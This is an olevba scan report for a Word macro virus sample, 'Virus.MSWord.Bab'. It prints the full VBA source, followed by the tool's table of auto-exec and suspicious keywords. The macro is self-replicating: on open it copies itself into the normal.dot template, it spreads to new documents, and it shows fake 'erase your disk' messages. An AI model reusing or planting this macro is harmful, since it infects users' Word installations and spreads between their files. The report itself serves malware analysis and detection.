olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Bab
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Bab - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: ./Virus.MSWord.Bab - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Set fs = CreateObject("Scripting.FileSystemObject")
If fs.FileExists("C:\windows\system\MBAB.txt") = False Then
ActiveDocument.SaveAs ("c:\windows\system\MBAB.Doc")
Application.OrganizerCopy Source:=ActiveDocument.FullName, _
Destination:="c:\windows\Application data\microsoft\modèles\normal.dot", _
Name:="Module1", _
Object:=wdOrganizerObjectProjectItems
MsgBox "Vous venez d'ouvrir un document infecté par MBAB !!", vbExclamation + vbOKOnly, "Windows_Class_4°"
Set fs = CreateObject("Scripting.FileSystemObject")
Set a = fs.CreateTextFile("c:\Windows\System\MBAB.txt", True)
a.WriteLine ("|sz@@#gbbt{^#@@@#^---[M´`~??/B^¨%%$ +%ù^ A^*¨%B¨PM.0")
a.Close
Else
End If
End Sub
Sub AutoNew()
Application.OrganizerCopy Source:="C:\Windows\system\MBAB.doc", _
Destination:=ActiveDocument.FullName, _
Name:="Module1", _
Object:=wdOrganizerObjectProjectItems
End Sub
Sub AutoExit()
MsgBox "0101010001011101010101MON1010010011110100101001001NOM0101010EST10100100011110100010010MBAB0101001101101010101001ERASE1010101011001001101010YOUR10101101010110010101010H00010001011A01001011R101010D0010101110011010111010DISK11101010101011110000101", vbExclamation, "MBAB MBAB MBAB MBAB MBAB MBAB MBAB MBAB MBAB MBAB MBAB MBAB MBAB MBAB"
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

